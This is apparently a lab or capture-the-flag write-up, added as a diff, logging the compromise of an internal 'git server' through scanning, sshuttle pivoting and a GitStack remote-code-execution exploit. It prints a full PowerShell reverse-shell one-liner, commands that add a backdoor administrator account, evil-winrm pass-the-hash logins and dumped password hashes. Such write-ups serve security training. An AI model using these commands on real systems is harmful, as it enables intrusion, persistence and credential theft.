@@ -1,0 +1,118 @@
+
+
+Git server
+------------
+
+Scanning the git server after uploading a static nmap binary...
+
+	Found 2 new hosts.
+
+		- 10.200.90.100
+			- Contains filtered ports
+		- 10.200.90.150
+			- 135
+			- 3389	To be checked
+			- 445
+			- 139
+			- 80	To be checked 
+			- 5985	To be checked
+
+5985
+	- This is running an http server
+
+
+Nmap Scan
+-----------
+
+```10.200.90.150
+
+80/tcp    open  http          syn-ack ttl 128
+135/tcp   open  epmap         syn-ack ttl 128
+139/tcp   open  netbios-ssn   syn-ack ttl 128
+445/tcp   open  microsoft-ds  syn-ack ttl 128
+3389/tcp  open  ms-wbt-server syn-ack ttl 128
+5357/tcp  open  wsdapi        syn-ack ttl 128
+5985/tcp  open  wsman         syn-ack ttl 128
+47001/tcp open  winrm         syn-ack ttl 128
+
+```
+
+- Pivoting through port forwarding using sshuttle
+	- The machine didn't respond to ping requests.
+
+
+- Got into the network... Accessed the website; found 3 paths on http://10.200.90.150:80
+
+/gitstack directory giving access to a login form... Found an exploit... Not sure, if it's for the current version number. (No version info retreieved)
+
+- Using exploit 43777 (rce).
+	- Exploit needed some changes... and code execution was successful.
+
+
+Note: Directory listing is available for the content that should not be visible to an unauthorized user
+	- Path found: /gitstack/DIRECTORIES/asdf
+
+- Trying to get reverse shell using the exploit.
+
+Uploading socat from the previously rooted prod-serv... and then enumerating there.
+
+- Ohhh, right... We can't invoke request... Because firewall is up... 
+	- To allow the firewall outbound traffic on a specific port:
+
+		firewall-cmd --zone=public --add-port PORT/tcp
+
+- Powershell reverse-shell (replace 'IP',PORT)
+	
+	powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+Stablization and Post Exploitation
+------------------------------------
+
+- We already got the nt authority\system user so we can create a dummy user for our operations...
+
+	net user j4x0n test123 /add
+	net localgroup Administrators j4x0n /add
+	net localgroup "Remote Manangement Users" j4x0n /add
+
+- The above commands will give us admin level shell access as well as rdp access to that user.
+
+- For the shell access in cmd, we can use evil-winrm
+	sudo gem install evil-winrm
+
+	evil-winrm -u j4x0n -p test123 -i <IP> -P <port>
+
+- For RDP access we can use a tool: xfreerdp (it gives vast number of options; from routing audio and usb connections to pass-the-hash attacks over rdp)
+	- Following are a few useful switches/flags you can use in this tool:
+
+		- /v - To specify IP/hostname
+		- /u - To speciy username
+		- /p - To specify password
+		- /dynamic-resolution - allows us to resize the window.
+		- /size:WidthxHeight - sets specific height and width that don't resize automatically with /dynamic-resolution
+		- +clipboard - enables clipboard support
+		- /drive:LOCAL_DIRECTORY,SHARE_NAME - Allows to share files across the attacker machine and the machine with RDP access.
+			- Because of this switch... We don't need to store files on the host machine... We can easily use our toolset by directly mounting our directory to it.
+			- We can access the shared drive with GUI access or with CUI \\tsclient\<nameoftheshare>
+
+- Ran mimikatz the on the machine...
+	- dumped password hashes
+
+		Thomas:02d90eda8f6b6b06c32d5f207831101f
+		Administrator:37db630168e5f82aafa8461e05c6bbd1
+
+- After cracking Thomas's hash
+
+	Thomas:i<3ruby
+
+Note: We can login via cui with evil-winrm authenticating using a hash... with -H flag.
+	
+	evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i <IP> 
+
+Extra Notes
+-------------
+
+How is that a static binary?
+
+
+I am on this git server for about 2 hours...
